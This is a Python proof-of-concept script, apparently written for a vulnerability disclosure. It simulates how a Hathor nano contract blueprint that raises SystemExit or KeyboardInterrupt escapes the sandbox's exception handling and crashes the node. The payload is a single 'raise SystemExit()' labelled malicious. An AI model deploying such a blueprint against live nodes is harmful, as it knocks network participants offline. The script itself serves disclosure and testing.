"""
PoC: SystemExit Sandbox Escape in Hathor Nano Contracts

This demonstrates that SystemExit escapes the metered exception handlers
and would propagate to vertex_handler's crash_and_exit() in a live node.

The key insight is Python's exception hierarchy:
  BaseException
  +-- SystemExit        <-- NOT caught by 'except Exception'
  +-- KeyboardInterrupt <-- NOT caught by 'except Exception'
  +-- GeneratorExit     <-- NOT caught by 'except Exception'
  +-- Exception         <-- caught by 'except Exception'
       +-- NCFail
       +-- RuntimeError
       +-- ...

The metered_exec.py handler catches NCFail and Exception, but
SystemExit/KeyboardInterrupt/GeneratorExit all escape.
"""
import sys


# Simulate the NCFail exception hierarchy
class NCFail(Exception):
    pass


# Simulate MeteredExecutor.call() exception handling (metered_exec.py:103-109)
def metered_call(blueprint_method):
    """Simulates MeteredExecutor.call() from metered_exec.py"""
    try:
        blueprint_method()  # This is where the sandboxed code runs
    except NCFail:
        raise
    except Exception as e:
        # This handler does NOT catch SystemExit because
        # SystemExit inherits from BaseException, not Exception
        raise NCFail from e
    # SystemExit propagates PAST this function


# Simulate block_executor.execute_transaction() (block_executor.py:241-254)
def execute_transaction(blueprint_method):
    """Simulates NCBlockExecutor.execute_transaction()"""
    try:
        metered_call(blueprint_method)
    except NCFail as e:
        print(f"[SAFE] NCFail caught in block_executor: {e}")
        return "failure"
    # SystemExit propagates PAST this function too
    return "success"


# Simulate vertex_handler._old_on_new_vertex() (vertex_handler.py:175-183)
def on_new_vertex(blueprint_method):
    """Simulates VertexHandler._old_on_new_vertex()"""
    try:
        execute_transaction(blueprint_method)
    except BaseException as e:
        print(f"[CRASH] BaseException caught in vertex_handler: {type(e).__name__}: {e}")
        print("[CRASH] crash_and_exit() would be called here")
        print("[CRASH] reactor.stop(); reactor.crash(); sys.exit(-1)")
        return False
    return True


# The malicious blueprint method
def crash_node():
    raise SystemExit()


# Also test KeyboardInterrupt
def crash_node_keyboard():
    raise KeyboardInterrupt()


# Run the exploits
print("=" * 60)
print("Hathor Nano Contract SystemExit Sandbox Escape PoC")
print("=" * 60)
print()

print("--- Test 1: SystemExit ---")
print("Deploying blueprint with 'raise SystemExit()'")
result = on_new_vertex(crash_node)
print()
if not result:
    print("[RESULT] Node would crash and enter permanent boot loop")
else:
    print("[RESULT] Unexpected: exploit did not work")

print()
print("--- Test 2: KeyboardInterrupt ---")
print("Deploying blueprint with 'raise KeyboardInterrupt()'")
result = on_new_vertex(crash_node_keyboard)
print()
if not result:
    print("[RESULT] Node would crash and enter permanent boot loop")
else:
    print("[RESULT] Unexpected: exploit did not work")

print()
print("--- Test 3: Normal Exception (should be safe) ---")


def normal_exception():
    raise ValueError("normal error")


result = on_new_vertex(normal_exception)
print()
if result:
    print("[RESULT] Normal exception correctly caught as NCFail - node survives")
else:
    print("[RESULT] Unexpected: normal exception caused crash")

print()
print("=" * 60)
print("CONCLUSION: SystemExit and KeyboardInterrupt escape the sandbox")
print("while normal exceptions are safely caught.")
print("=" * 60)
